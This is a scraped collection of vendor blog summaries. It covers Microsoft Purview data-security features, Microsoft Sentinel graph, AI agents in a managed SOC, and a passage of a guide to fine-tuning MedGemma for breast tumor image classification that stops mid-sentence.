      "summary": "Today, data moves across clouds, apps, and devices at an unprecedented speed, often outside the visibility of siloed legacy tools. The rise of autonomous agents, generative AI, and distributed data ecosystems means that traditional perimeter-based security models are no longer sufficient. Even though companies are spending more than $213 billion globally , they still face several persistent security challenges: Fragmented tools don\u2019t integrate together well and leave customers lacking full visibility of their data security risks The growing use of AI in the workplace is creating new data risks for companies to manage The shortage of skilled cybersecurity professionals is making it difficult to accomplish data security objectives Microsoft is a global leader in cloud, productivity, and security solutions. Microsoft Purview benefits from this breadth of offerings, integrating seamlessly across Microsoft 365, Azure, Microsoft Fabric, and other Microsoft platforms \u2014 while also working in harmony with complementary security tools. Unlike fragmented point solutions, Purview delivers an end-to-end data security platform built into the productivity and collaboration tools organizations already rely on. This deep understanding of data within Microsoft environments, combined with continually improving external data risk detections, allows customers to simplify their security stack, increase visibility, and act on data risks more quickly. At Ignite, we\u2019re introducing the next generation of data security \u2014 delivering advanced protection and operational efficiency, so security teams can move at business speed while maintaining control of their data. Go beyond visibility into action, across your data estate Many customers today lack a comprehensive view of how to holistically address data security risks and properly manage their data security posture. To help customers strengthen data security across their data estate, we are excited to announce the new, enhanced Microsoft Purview Data Security Posture Management (DSPM) . This new AI-powered DSPM experience unifies current Purview DSPM and DSPM for AI capabilities to create a central entry point for data security insights and controls, from which organizations can take action to continually improve their data security posture and prioritize risks. The new capabilities in the enhanced DSPM experience are: Outcome-Based workflows : C hoose a data security objective and see related metrics, risk patterns, a recommended action plan and its impact - going from insight to action. Expanded coverage and remediation on Data Risk Assessments: Conduct item-level analysis with new remediation actions like bulk disabling of overshared SharePoint links. O ut - of - box p osture report s : Uncover data protection gaps and track security posture improvements with out-of-box reports that provide rich context on label usage, auto-labeling effectiveness, posture drift through label transitions, and DLP policy activities. A I Observability : S urface an organization\u2019s agent inventory with assigned agent risk level and agent posture metrics based on agentic interactions with the organization\u2019s data . New Security Copilot Agent : Acc elerate the discovery and analysis of sensitive data to uncover hidden risks across files, emails, and messages. G ain visibility of non-Microsoft data within your data estate : Enable a unified view of data risks by gaining visibility into S alesforce, Snowflake, Google Cloud Platform, and Databricks \u2013 available through integration s with external partners via Microsoft Sentinel. T hese DSPM enhancements will be available in Public Preview within the upcoming weeks. Learn more in our blog dedicated to the announcement of the new Microsoft Purview DSPM . Together, these innovations reflect a larger shift: data security is no longer about silos\u2014it\u2019s about unified visibility and control everywhere data lives and having a comprehensive understanding of the data estate to detect and prevent data risks. Organizations trust Microsoft for their productivity and security platforms, but their footprint spans across third-party data environments too. That\u2019s why Purview continues to expand protection beyond Microsoft environments. In addition to bringing in 3 rd party data into DSPM, we are also expanding auto-labeling to three new Data Map sources, adding to the data sources we previously announced . Currently in public preview, the new sources include Snowflake, SQL Server, and Amazon S3. Once connected to Purview, admins gain an \u201cat-a-glance\u201d view of all data sources and can automatically apply sensitivity labels, enforcing consistent security policies without manual effort. This helps organizations discover sensitive information at scale, reduce the risk of data exposure, and ensure safer AI adoption all while simplifying governance through centralized policy management and visibility across their entire data estate. Enable AI adoption and prevent data oversharing As organizations adopt more autonomous agents, new risks emerge , such as unsupervised data access and creation, cascading agent interactions, and unclear data activity accountability. Besides AI Observability in DSPM providing details on the inventory and risk level of the agents, Purview is expanding its industry-leading data security and compliance capabilities to secure and govern agents that inherit users\u2019 policies and controls, as well as agents that have their own unique IDs, policies, and controls. This includes agent types across Microsoft 365 Copilot, Copilot Studio, Microsoft Foundry, and third-party platforms. Key enhancements include: Extension of Purview Information Protection and Data Loss Prevention policies to autonomous agents : Scope a utonomous agents with an Agent ID into Purview policies that work fo r users across Microsoft 365 apps, including Exchange, SharePoint, and Teams . Microsoft Purview Insider Risk Management for Agents: W ith d edicated indicators and behavioral analytics to flag specific risky agent activities, enabl e proactive investigation by assigning risk levels to each agent. Extensi on of Purview data compliance capabilities to agent interactions : Microsoft Purview Communication Compliance, Data Lifecycle Management, Audit, and eDiscovery extend to agent interactions, supporting responsible use, secure retention, and agentic accountability. Purview SDK embedded in Agent Framework SDK: Purview SDK embedded in Agent Framework SDK enables developers to integrate enterprise-grade security, compliance, and governance into AI agents. It delivers automatic data classification, prevents sensitive data leaks and oversharing, and provides visibility and control for regulatory compliance, empowering secure adoption of AI agents in complex environments. Purview integration with Foundry: Purview is now enabled within Foundry , allowing Foundry admins to activate Microsoft Purview on their subscription. Once enabled, interaction data from all apps and agents flows into Purview for centralized compliance, governance, and posture management of AI data. Azure AI Search honors Purview labels and policies: Azure AI Search now ingests Microsoft Purview sensitivity labels and enforces corresponding protection policies through built-in indexers (SharePoint, OneLake , Azure Blob, ADLS Gen2). This ensures secure, policy-aligned search over enterprise data, enabling agentic RAG scenarios where only authorized documents are returned or sent to LLMs, preventing oversharing and aligning with enterprise data protection standards. Extension of Purview Data Loss Prevention policies to Copilot Mode in Edge for Business: This week, Microsoft Edge for Business introduced Copilot Mode , transforming the browser into a proactive, agentic partner . This is AI-assisted browsing will honor the user\u2019s existing DLP protections, such as endpoint DLP policies that prevent pasting to sensitive service domains, or summarizing sensitive page content . A risk score will be assigned to each agent based on dedicated Insider Risk Management indicators and behavioral analytics to flag potentially risky activity. Learn more in our blog dedicated to the announcements of Microsoft Purview for Agents. New capabilities in Microsoft Purview, now in public preview, to help prevent data oversharing and leakage through AI include: Expansion of Microsoft Purview Data Loss Prevention (DLP) for Microsoft 365 Copilot: Previously, we introduced DLP for Microsoft 365 Copilot to prevent labeled files & emails from being used as grounding data for responses, therefore reducing the risk of oversharing. Today, we are expanding DLP for Microsoft 365 Copilot to safeguard prompts containing sensitive data. This real-time control helps organizations mitigate data leakage and oversharing risks by preventing Microsoft 365 Copilot, Copilot Chat, and Microsoft 365 Copilot agents from returning a response when prompts contain sensitive data or using that sensitive data for grounding in Microsoft 365 or the web. For example, if a user searches, \u201cCan you tell me more about my customer based on their address: 1234 Main Street,\u201d Copilot will both inform the user that organizational policies prevent it from responding to their prompt, as well as block any web queries to Bing for \u201c1234 Main Street.\u201d Enhancements to inline data protection in Edge for Business: Earlier this year , we introduced inline data protection in Edge for Business to prevent sensitive data from being leaked to unmanaged consumer AI apps, starting with ChatGPT, Google Gemini, and DeepSeek. We are not only making this capability generally available for the initial set of AI apps, but also expanding the capability to 30+ new apps in public preview and supporting file upload activity in addition to text. This addresses potential data leakage that can occur when employees send organizational files or data to consumer AI apps for help with work-related tasks, such as document creation or code reviews. Inline data protection for the network: For user activity outside of the browser, we are also enabling inline data protection at the network layer. Earlier this year , we introduced integrations with supported secure service edge (SSE) providers to detect when sensitive data is shared to unmanaged cloud locations, such as consumer AI apps or personal cloud storage, even if sharing occurs outside of the Edge browser. In addition to the discovery of sensitive data, these integrations now support protection controls that block sensitive data from leaving a user device and reaching an unmanaged cloud service or application. These capabilities are now generally available through the Netskope and iboss integrations, and inline data discovery is available in public preview through the Palo Alto Networks integration. Extension of Purview protection to on-device AI: Purview DLP policies now extend to the Recall experience in Copilot+ PC devices to prevent sensitive organizational data from being undesirably captured and retained. Admins can now block Recall snapshots based on sensitivity label or the presence of Purview sensitive information types (SITs) in a document open on the device, or simply honor and display the sensitivity labels of content captured in the Recall snapshot library. For example, a DLP policy can be configured to prevent recall from taking snapshots of any documents labeled \u201cHighly Confidential,\u201d or a product design file that contains intellectual property. Learn more in the Windows IT Pro blog . Best-in-class data security for Microsoft environments Microsoft Purview sets the standard for data security within its own ecosystem. Organizations benefit from unified security policies and seamless compliance controls that are purpose-built for Microsoft environments, ensuring sensitive data remains secure without compromising productivity. We also are constantly investing in expanding protections and controls to Microsoft collaboration tools including SharePoint, Teams, Fabric, Azure and across Microsoft 365. On-demand classification adds meeting transcript coverage and new enhancements: To help organizations protect sensitive data sitting in data-at-rest, on-demand classification now extends to meeting transcripts, enabling the discovery and classification of sensitive information shared in existing recorded meeting transcripts. Once classified, admins can set up DLP or Data Lifecycle Management (DLM) policies to properly protect and retain this data according to organizational policies. This is now generally available, empowering organizations to strengthen data security, streamline compliance, and ensure even sensitive information in data-at-rest is discovered, protected, and governed more effectively. In addition, on-demand classification for endpoints is also generally available, giving organizations even broader coverage across their data estate. New usage posture and consumption reports : We\u2019re introducing new usage posture and consumption reports, now in public preview. Admins can quickly identify compliance gaps, optimize Purview seat assignments, and understand how consumptive features are driving spend. With granular insights by feature, policy, and user type, admins can analyze usage trends, forecast costs, and toggle consumptive features on and off directly, all from a unified dashboard. The result: stronger compliance, easier cost management, and better alignment of Purview investments to your organization\u2019s needs. Enable DLP and Copilot protection with extended SharePoint permissions: Extended SharePoint permissions, now generally available, make it simple to protect and manage files in SharePoint by allowing library owners to apply a default sensitivity label to an entire document library. When this is enabled, the label is dynamically enforced across all unprotected files in the library, both new and existing , within the library. Downloaded files are automatically encrypted, and access is managed based on SharePoint site membership, giving organizations powerful, scalable access control. With extended SharePoint permissions, teams can consistently apply labels at scale, automate DLP policy enforcement, and confidently deploy Copilot, all without the need for manually labeling files. Whether for internal teams, external partners, or any group where permissions need to be tightly controlled, extended SharePoint permissions streamline protection and compliance in SharePoint. Network file filtering via Entra GSA integration: We are integrating Purview with Microsoft Entra to enable file filtering at the network layer. These filtering controls help prevent sensitive content from being shared to unauthorized services based on properties such as sensitivity labels or presence of Purview sensitive information types (SITs) within the file. For example, Entra admins can now create a file policy to block files containing credit card numbers from passing through the network. Learn more here . Expanded protection scenarios enabled by Purview endpoint DLP: We are introducing several noteworthy enhancements to Purview endpoint DLP to protect an even broader range of exfiltration or leakage scenarios from organizational devices, without hindering user productivity. These enhancements, initially available on Windows devices, include: Extending protection to unsaved files: Files no longer need to be saved to disk to be protected under a DLP policy. With this improvement, unsaved files will undergo a point-in-time evaluation to detect the presence of sensitive data and apply the appropriate protections. Expanded support for removable media: Admins can now prevent data exfiltration to broader list of removable media devices, including iPhones, Android devices, and CD-ROMs. Protection for Outlook attachments downloaded to removable media or network shares: Admins can now prevent exfiltration of email attachments when users attempt to drag and drop them into USB devices, network shares, and other removable media. Expanded capability support for macOS: In addition to the new endpoint DLP protections introduced above, we are also expanding the following capabilities, already available for Windows devices, to devices running on macOS: Expanded file type coverage to 110+ file types , blanket protections for non-Office or PDF file types , addition of \u201c allow \u201d and \u201c off \u201d policy actions , device-based policy scoping to scope policies to specific devices or device groups (or apply exclusions), and integration with Power Automate . Manageability and alert investigation improvements in Purview DLP: Lastly, we are also introducing device manageability and alert investigation improvements in Purview DLP to simplify the day-to-day experience for admins. These improvements include: Reporting and troubleshooting improvements for devices onboarded to endpoint DLP: We are introducing additional tools for admins to build confidence in their Purview DLP protections for endpoint devices. These enhancements, designed to maximize reliability and enable better troubleshooting of potential issues, include near real-time reporting of policy syncs initiated on devices and policy health insights into devices\u2019 compliance status and readiness to receive policies. Enhancements to always-on diagnostics: Earlier this year , we introduced always-on diagnostics to automatically collect logs from Windows endpoint devices, eliminating the need to reproduce issues when submitting an investigation request or raising a support ticket. This capability is expanding so that admins now have on-demand access to diagnostic logs from users\u2019 devices without intervening in their operations. This further streamlines the issue resolution process for DLP admins while minimizing end user disruption. Simplified DLP alert investigation , including easier navigation to crucial alert details in just 1 click, and the ability to a ggregate alerts originating from a single user for more streamlined investigation and response. For organizations who manage Purview DLP alerts within their broader incident management process in Microsoft Defender, we are pleased to share that alert severities will now be synced between the Purview portal and the Defender portal. Expanding enterprise-grade data security to small and medium businesses (SMBs): Purview is extending its reach beyond large enterprises by introducing a new add-on for Microsoft 365 Business Premium , bringing advanced data security and compliance capabilities to SMBs. The Microsoft Purview suite for Business Premium brings the same enterprise-grade protection, such as sensitivity labeling, data loss prevention, and compliance management, to organizations with up to 300 users. This enables SMBs to operate with the same level of compliance and data security as large enterprises, all within a simplified, cost-effective experience built for smaller teams. Stepping into the new era of technology with AI-powered data security Globally, there is a shortage of skilled cybersecurity professionals. Simultaneously, the volume of alerts and incidents is ever growing. By infusing AI into data security solutions, admins can scale their impact. By reducing manual workloads, they enhance operational effectiveness and strengthen overall security posture \u2013 allowing defenders to stay ahead. In 2025, 82% of organizations have developed plans to use GenAI to fortify their data security programs. With its cutting-edge generative AI-powered investigative capabilities, Microsoft Purview Data Security Investigations (DSI) is transforming and scaling how data security admins analyze incident-related data. Since being released into public preview in April, the product has made a big impact with customers like Toyota Motors North America. \" Data Security Investigations eliminates manual work, automating investigations in minutes. It\u2019s designed to handle the scale and complexity of large data sets by correlating user activity with data movement, giving analysts a faster, more efficient path to meaningful insights ,\u201d said solution architect Dan Garawecki. This Ignite, we are introducing several new capabilities in DSI, including: DSI integration with DSPM : View proactive, summary insights and launch a Data Security Investigation directly from DSPM. This integration brings the full power of DSI analysis to your fingertips, enabling admins to drill into data risks surfaced in DSPM with speed and precision. Enhancements in DSI AI-powered deep content analysis capabilities : Admins can now add context before AI analysis for higher-quality, more efficient investigations. A new AI-powered natural language search function lets admins locate specific files using keywords, metadata, and embeddings. Vector search and content categorization enhancements allow admins to better identify risky assets. Together, these enhancements equip admins with sharper, faster tools for identifying buried data risks \u2013 both proactively and reactively. DSI cost transparency report and in-product estimator : To help customers manage pay-as-you-go billing, DSI is adding a new lightweight in-product cost estimator and transparency report. We are also expanding Security Copilot in Microsoft Purview with AI-powered capabilities that strengthen both the protection and investigation of sensitive data by introducing the Data Security Posture Agent and Data Security Triage Agent . Data Security Posture Agent: Available in preview, the new Data Security Posture Agent uses LLMs to help admins answer \u201cIs this happening?\u201d across thousands of files\u2014delivering fast, intent-driven discovery and risk profiling, even when explicit keywords are absent. Integrated with Purview DSPM, it surfaces actionable insights and improves compliance, helping teams reduce risk and respond to threats before they escalate. Data Security Triage Agent: Alongside this, the Data Security Triage Agent, now generally available, enables analysts to efficiently triage and remediate the most critical alerts, automating incident response and surfacing the threats that matter most. Together, these agentic capabilities convert high-volume signals into consistent, closed-loop action, accelerate investigations and remediation, reduce policy-violation dwell time, and improve audit readiness, all natively integrated within Microsoft 365 and Purview so security teams can scale outcomes without scaling headcount. The Data Security Triage Agent simplifies alert management by automating response workflows and surfacing the highest-priority threats. It also takes action by engaging document owners directly, identifying where sensitive data is exposed and guiding them through the cleanup process. To make the agents easily accessible and help teams get started more quickly, we are excited to announce that Security Copilot will be available to all Microsoft 365 E5 customers. Rollout starts today for existing Security Copilot customers with Microsoft 365 E5 and will continue in the upcoming months for all Microsoft 365 E5 customers. Customers will receive advanced notice before activation.

      "title": "Uncover hidden security risks with Microsoft Sentinel graph",
      "summary": "Earlier this fall, we launched Microsoft Sentinel graph \u2013 and today, we are pleased to announce that Sentinel graph is generally available starting December 1, 2025. Microsoft Sentinel graph maps the interconnections across activity, asset, and threat intelligence data. This enables comprehensive graph-based security and analysis across pre-and post-breach scenarios in both Microsoft Defender and Microsoft Purview. Customers are already seeing the impact of the graph-powered experiences that is providing insights beyond tabular queries. \"The predefined scenarios in Sentinel graph are excellent... it definitely shows where I would need to look as an investigator to figure out what's happening in my environment, who has access to it, not only directly, but also indirectly, a couple of hops away. And that's something that you really can't get through a standard KQL query...\" - Gary Bushey, Security Architect, Cyclotron, Inc. Building on this foundation, we are taking Sentinel graph to the next level and are excited to announce the public preview of the following new capabilities. Graph MCP Tools Building on the hunting graph and blast radius analysis capabilities in Microsoft Defender portal. We are excited to announce preview of purpose-built Sentinel graph MCP tools (Blast Radius, Path Discovery, and Exposure Perimeter) that make the graph-powered insights accessible to the AI agents. Using these purpose-built Sentinel graph MCP tools, you will be able to use and build AI agents to get insights from the graph in natural language (figure 1): \u201cWhat is the blast radius from \u2018Laura Hanak\u2019?\u201d \u201cIs there a path from user Mark Gafarov to key vault wg-prod?\u201d \u201cWho can all get to wg-prod key vault?\u201d Figure 1: Sentinel graph MCP tools using GitHub Copilot in VS Code You can sign up here for a free preview of Sentinel graph MCP tools, which will also roll out starting December 1, 2025. Custom Graphs The security operations teams, including Tier-3 analysts, threat intelligence specialists, and security researchers play a critical role in investigating sophisticated attacks and addressing systemic security issues. Their responsibilities range from uncovering design vulnerabilities and tracing historical exploitation, to analyzing types of abuse and recommending effective solutions. These experts strive to identify hidden patterns within organizational data and struggle with the right tools that can help them differentiate between normal vs. abnormal, keep-up with the changing attack patterns, and handle massive and complex datasets at scale. This requires a high level of flexibility and customization to rapidly iterate on the analysis. We\u2019re taking Microsoft Sentinel graph to the next level and are thrilled to announce the public preview of custom graphs with two new powerful approaches designed specifically for security: ephemeral custom graphs and materialized custom graphs. These innovative approaches empower defenders to create and analyze graphs tailored and tuned to their unique security scenarios to find hidden risks and patterns in their security data available in the Sentinel data lake. Using their data in the lake, defenders will be able author notebooks (figure 2) to model, build, visualize, traverse, and run advanced graph analyses like Chokepoint/Centrality, Blast Radius/Reachability, Prioritized Path/Ranked, and K-hop. It\u2019s a transformative leap in graph analytics, fundamentally changing how security teams understand and mitigate organizational risk by connecting the dots in their data. Figure 2: Custom graphs using Notebook in VS Code You can sign up here for a free preview of custom graph capability, which will also roll out starting December 1, 2025. Ephemeral Custom Graphs Ephemeral custom graphs are for one-time investigations requiring quick pattern examination and rapidly changing large scale data that doesn't justify materialization for reuse. For example, in a typical SOC investigation, brute-force attempts or privilege escalations appear as isolated incidents. But in reality, attackers move laterally through interconnected credentials and resources. Let\u2019s assume, a service account (svc-backup) used by a legacy database is compromised. It holds group membership in \u201cDataOps-Admins,\u201d which shares access with \u201cEngineering-All.\u201d A developer reuses their personal access token across staging and production clusters. Individually, these facts seem harmless. Together, they form a multi-hop credential exposure chain that can only be detected through graph traversal. Sentinel graph helps you to build ad-hoc graphs for an investigation and discarded afterward (not kept in a database for reuse). You can pull the data from the Sentinel data lake and build a graph to explore relationships, run analytics, iterate on nodes/edges, and refine queries in an interactive loop. Here are some additional scenarios where ephemeral custom graphs can expose hidden patterns: Sign-in anomaly hunting: An analyst graphs user logins against source IPs and timestamps to identify unusual patterns (like a single IP connecting to many accounts). By iterating on the graph (filtering nodes, adding context like geolocation), they can spot suspicious login clusters or a credential theft scenario. TTP (Tactics, Techniques, Procedures) investigation: For a specific threat (e.g., a known APT\u2019s techniques), the hunter might use a graph template to map related events. Microsoft Sentinel, for instance, can provide hunting notebook templates for scenarios like investigating lateral movement or scanning logs for leaked credentials, so analysts quickly construct a graph of relevant evidence. Audit log pattern discovery: By graphing Office 365 activity logs or admin audit logs, defenders can apply advanced graph algorithms (like betweenness centrality) to find outliers \u2013 e.g., an account that intermediates many rare files access relationships might indicate insider abuse. Materialized Custom Graphs Materialized custom graphs are graph datasets that are stored and maintained over time, often updated at intervals (e.g., daily or hourly). Instead of being thrown away each session, these graphs will be materialized in the graph database for running graph analytics and visualization. Materialized custom graphs will enable organizations to create their custom enterprise knowledge graphs for various use cases, such as every organization already has an identity graph \u2014 they just haven\u2019t visualized it yet. Imagine a large enterprise where users, devices, service principals, and applications are constantly changing. New credentials are issued, groups evolve, and permissions shift by the hour. Over time, this churn creates a complex web of implicit trust and shared access that no static tool can capture. Organizations can now build their own identity graphs and materialize them. These materialized custom graphs can continuously map relationships across Azure AD Domain Services, Entra ID, AWS IAM, SaaS platforms, and custom applications, updating daily or hourly to reflect the organization\u2019s true security topology. Organizations can query these graphs and run various advanced graph algorithms and understand the chokepoint, blast radius, attack paths, and so on. This helps detect the gradual buildup of privilege overlap \u2014 when identities that were once isolated begin to share access paths through evolving group memberships, role assignments, or inherited permissions. Over weeks or months, these subtle shifts expand the blast radius of any single compromise. Behind the scenes We are partnering with our friends in Microsoft Fabric to bring these new capabilities to market. Mapping a large digital estate into a graph requires new scale out approach and that is what graph in Microsoft Fabric enables. \u201cDiscovering modern security risks is a massive data challenge. It requires connecting the dots across an entire digital estate, which can only be achieved with a graph at hyperscale. This is why our Fabric team's partnership with the Sentinel graph team is so critical. We\u2019ve collaborated to build a scale-out graph solution capable of processing billion nodes and edges, delivering the performance and scale our largest security customers need to stay ahead of threats.\u201d - Yitzhak Kesselman, CVP, Fabric Real-Time Intelligence Getting started Check out this video to learn more.

      "title": "Charting the Future of SOC: Human and AI Collaboration for Better Security",
      "summary": "Co-authors: Sylvie Liu, Principa l Product Manager Rajiv Bharadwaja, Principal Software Engineering Manager Abhishek Kumar, Principal Group Manager - Security Research & Operations Security operations centers are under pressure from unprecedented scale and complexity. Speed, precision, and consistency matter more than ever, and AI is everywhere\u2014but hype alone doesn\u2019t solve the challenge. This blog shares our journey and insights from building autonomous AI agents for MDR operations and explores how the shift to a GenAI-powered SOC redefines collaboration between humans and AI. Beyond our managed services, Microsoft Defender Experts strive to be a trusted partner in SOC evolution, helping customers across the broader security ecosystem to anticipate process changes, plan for upskilling, and adopt agentic workflows with confidence. From Vision to Reality: Building the SOC of the Future Attackers are evolving at unprecedented speed, using AI to outpace defenses scale. Defender Experts is pioneering the transformation to build the SOC of the future by integrating advanced AI capabilities into our SOC workflows, which is critical for today\u2019s threat landscape. We\u2019ve seen AI deliver real results\u2014in our earlier blog , we shared how Defender Experts applies AI to cut through noise without compromising on detecting real threats, enabling 50% of noise to be triaged automatically with high precision. Autonomous AI agents are foundational to the SOC of the future. Our vision is a predictive, adaptive model where agentic AI and automation remove manual toil, accelerate contextual insight, and execute both single tasks and complex workflows. Analysts are elevated, acting as orchestrators of governed action, driving high-impact decisions, and continuously tuning the system for transparency and trust. Agents handle repetitive, time-intensive tasks, while humans remain the final authority for strategic outcomes. Together, this creates a SOC that moves from reactive alert handling to proactive, explainable defense. It is always auditable and under human governance. How Microsoft Defender Experts is Pioneering This Shift Defender Experts builds autonomous AI agents with expert knowledge, expert-defined guardrails and human-in-the-loop validation to deliver structured, trustworthy outputs that accelerate investigations without compromising quality. These AI agents are designed to drive efficiency and consistency across our MDR operations, helping us respond to the threats faster and with confidence. As we advance this model, we\u2019re not only improving speed and precision, we\u2019re redefining our security operations. That means rethinking SOC analyst roles, skill composition, workflow design, the tooling support, the accompanying automation, and the evaluation and monitoring systems needed to maintain trust. Abhishek Kumar, lead of the Defender Experts security operations team, is deeply engaged in this transformation as we build the GenAI-powered SOC. From Abhishek\u2019s perspective \u201cThis is an exciting era for anyone in security research and operations. We are seeing a monumental shift where security analysts and threat hunters are elevating the role from handling routine tasks, to delivering high value insights. AI agents are rapidly reducing analyst fatigue and freeing up essential time, allowing experts to focus on critical thinking and contextual analysis of incidents.\" Agents are not just a productivity leap, they're enabling analysts and hunters to better investigate emerging and hidden threats, develop more hypotheses, and connect clues to unravel complex campaigns. Time once spent on repetitive work is now devoted to advanced tasks like posture data analysis, traversing security graphs, and using cross-product intelligence to uncover novel threats and threat actor infrastructure. Another way the autonomous AI agents are helping is by reducing cognitive loads on humans and enabling interactions with agents to achieve specific outcomes. For example, if there are hundreds of login attempts from unfamiliar locations, probably only one or two may be worth deeper investigations as they have additional insights attached to them which could be surfaced quickly by the agent. Similarly, an end point process tree that could take significant effort for humans to analyze can be done much faster with the agent to spot suspicious anomalies. To maximize the impact, one important skill needed by SOC analysts is to be able to craft and finetune prompts to get the right insights with GenAI. Inside the Technology: How We Bring Autonomous Agents to Life Behind the scenes, delivering trustworthy GenAI-based solutions at scale requires rigorous engineering and continuous collaboration with the security operations teams. We\u2019ve built AI agents on a foundation of expert-defined guardrails, curated test sets, and deployment-time checks to ensure reliability. Engineers, security analysts and researchers collaborated to refine workflows, enhance precision, and broaden coverage as the agents adapt to real-world threats. Each workflow begins under human oversight, reinforced by efficient engineering and analyst feedback loops that accelerate development while upholding security, privacy, and compliance standards. This transformation also demanded deep integration into Defender Experts core systems, from case management to remediation services, requiring ground-up engineering to accommodate long-running GenAI-based workflows alongside asynchronous backend processes. There is also a need for an orchestration engine that coordinates multi-layer automations, enabling rule-based logic, GenAI-powered features, and traditional AI models to work seamlessly together with the autonomous AI agents to maximize quality, efficiency and cost-effectiveness. The impact is clear: AI agents are now running on 75% of the phishing and malware incidents landing in the Defender Experts analyst queue. The AI agents autonomously arrive at the verdict determination, justification with data-backed summaries, customer-side queries for verification, and actionable remediation steps. With this combined Human and AI agent approach, we resolve incidents nearly 72% faster while maintaining quality and transparency. To achieve this, we follow a deliberate development and release journey. We start with internal evaluation on historic cases under strict privacy and compliance controls, establishing baselines for precision, recall, and quality. Next, we deploy the agents in \u201cdark mode,\u201d where agents investigate side-by-side with human analysts, enabling close monitoring and iterative improvements. From there, we move into pilot with customer design partners to validate methods and gather feedback, before expanding for broader adoption \u2014all with human backstop for review and validation. This disciplined autonomous AI agent development approach ensures that every step balances autonomy with oversight, giving customers confidence that advanced AI capabilities are grounded in proven outcomes and designed to strengthen resilience at scale. Preparing for the Future Our experience developing autonomous AI agents and deploying them in real MDR operations has reinforced our vision for the SOC of the future, a collaborative model where humans remain in the driver\u2019s seat to teach and lead, working alongside AI agents rather than being replaced by them. Together, they create faster, smarter, and more resilient security operations. As SOC teams embrace the shift to GenAI\u2011powered operations, these insights reflect the journey we\u2019ve taken and offer practical guidance to help navigate the transformation with confidence: Anticipate Process Changes : SOC teams will not follow the same workflows as before. Prepare for evolving processes and establish a lifecycle for AI and agent adoption with confidence. Foster Mindset Shift : Analysts used to traditional approaches often find it challenging to adopt new methods (e.g., running Kusto queries vs. writing prompts, run full end to end investigation vs. leveraging the agent output). Plan for change management and provide training to ease this transition. Evolving SOC Skills : Analyst roles are shifting in a GenAI-powered SOC. Analysts need to build expertise in prompt engineering, moving beyond manual case investigations to focus on advanced tasks such as posture data analysis and leveraging cross-product intelligence to uncover novel threats and map threat actor infrastructure. These evolving skills position analysts as strategic decision-makers, building collaboration between humans and AI to maximize effectiveness. Build Trust and Confidence : As security operations adopt AI agents, maintain a strong human\u2013AI feedback loop. Guardrails and human oversight are essential for trustworthy automation. Plan for Multi-layer AI and Automation : Automation continues to play a critical role in security operations. Explore how to orchestrate traditional automation and AI together to achieve efficiency, cost-effectiveness, and consistent quality. As we evolve toward the SOC of the future, we\u2019re learning what it takes to make human and AI collaboration successful, and we\u2019ll continue sharing those insights as we reimagine security operations together.",

      "title": "A step-by-step guide to fine-tuning MedGemma for breast tumor classification",
      "summary": "aside_block ), ('btn_text', ''), ('href', ''), ('image', None)])]> Artificial intelligence (AI) is revolutionizing healthcare, but how do you take a powerful, general-purpose AI model and teach it the specialized skills of a pathologist? This journey from prototype to production often begins in a notebook, which is exactly where we'll start. In this guide, we'll take the crucial first step. We'll walk through the complete process of fine-tuning the Gemma 3 variant MedGemma . MedGemma is Google's family of open models for the medical community, to classify breast cancer histopathology images. We're using the full precision MedGemma model because that's what you'll need in order to get maximum performance for many clinical tasks. If you're concerned about compute costs, you can quantize and fine-tune by using MedGemma's pre-configured fine-tuning notebook instead. To complete our first step, we'll use the Finetune Notebook . The notebook provides you with all of the code and a step-by-step explanation of the process, so it's the perfect environment for experimentation . I'll also share the key insights that I learned along the way, including a critical choice in data types that made all the difference. After we've perfected our model in this prototyping phase, we'll be ready for the next step. In an upcoming post , we'll show you how to take this exact workflow and move it to a scalable, production-ready environment using Cloud Run jobs . Setting the stage: Our goal, model, and data Before we get to the code, let's set the stage. Our goal is to classify microscope images of breast tissue into one of eight categories: four benign (non-cancerous) and four malignant (cancerous). This type of classification represents one of many crucial tasks that pathologists perform in order to make an accurate diagnosis, and we have a great set of tools for the job. We'll be using MedGemma , a powerful family of open models from Google that's built on the same research and technology that powers our Gemini models. What makes MedGemma special is that it isn't just a general model: it's been specifically tuned for the medical domain. The MedGemma vision component, MedSigLIP , was pre-trained on a vast amount of de-identified medical imagery, including the exact type of histopathology slides that we're using. If you don't need the predictive power of MedGemma, you can use MedSigLIP alone as a more cost-effective option for predictive tasks like image classification. There are multiple MedSigLIP tutorial notebooks that you can use for fine-tuning. The MedGemma language component was also trained on a diverse set of medical texts, making the google/medgemma-4b-it version that we're using perfect for following our text-based prompts. Google provides MedGemma as a strong foundation, but it requires fine-tuning for specific use cases\u2014which is exactly what we're about to do. To train our model, we'll use the Breast Cancer Histopathological Image Classification (BreakHis) dataset . The BreakHis dataset is a public collection of thousands of microscope images of breast tumor tissue that was collected from 82 patients using different magnifying factors (40X, 100X, 200X, and 400X). The dataset is publicly available for non-commercial research and it's detailed in the paper: F. A. Spanhol, L. S. Oliveira, C. Petitjean, and L. Heudel, A dataset for breast cancer histopathological image classification . 1 Handling a 4-billion parameter model requires a capable GPU, so I used an NVIDIA A100 with 40 GB of VRAM on Vertex AI Workbench . This GPU has the necessary power, and it also features NVIDIA Tensor Cores that excel with modern data formats, which we'll leverage for faster training. In an upcoming post, we'll explain how to calculate the VRAM that's required for your fine tuning. My float16 disaster: A crucial lesson in stability My first attempt to load the model used the common float16 data type to save memory. It failed spectacularly. The model's outputs were complete garbage, and a quick debugging check revealed that every internal value had collapsed into NaN (Not a Number) . The culprit was a classic numerical overflow . To understand why, you need to know the critical difference between these 16-bit formats: float16 (FP16) : Has a tiny numerical range. It can't represent any number that's greater than 65,504. During the millions of calculations in a transformer, intermediate values can easily exceed this limit, causing an overflow that creates a NaN . When a NaN appears, it contaminates every subsequent calculation. bfloat16 (BF16) : This format, developed at Google Brain, makes a crucial trade-off. It sacrifices a little bit of precision to maintain the same massive numerical range as the full 32-bit float32 format. The bfloat16 massive range prevents overflows, which keeps the training process stable. The fix was a simple one-line change, but it was based on this critical concept. The successful code: code_block )])]> Lesson learned: For fine-tuning large models, always prefer bfloat16 for its stability. It's a small change that saves you from a world of NaN -related headaches. The code walkthrough: A step-by-step guide Now, let's get to the code. I'll break down my Finetune Notebook into clear, logical steps. Step 1: Setup and installations First, you need to install the necessary libraries from the Hugging Face ecosystem and log into your account to download the model. code_block )])]> Hugging Face authentication and and the recommended approach to handle your secrets \u26a0\ufe0f Important security note: You should never hardcode secrets like API keys or tokens directly into your code or notebooks, especially in a production environment. This practice is insecure and it creates a significant security risk. In Vertex AI Workbench, t he most secure and enterprise-grade approach to handle secrets (like your Hugging Face token) is to use Google Cloud's Secret Manger . If you're just experimenting and you don't want to set up Secret Manager yet, you can use the interactive login 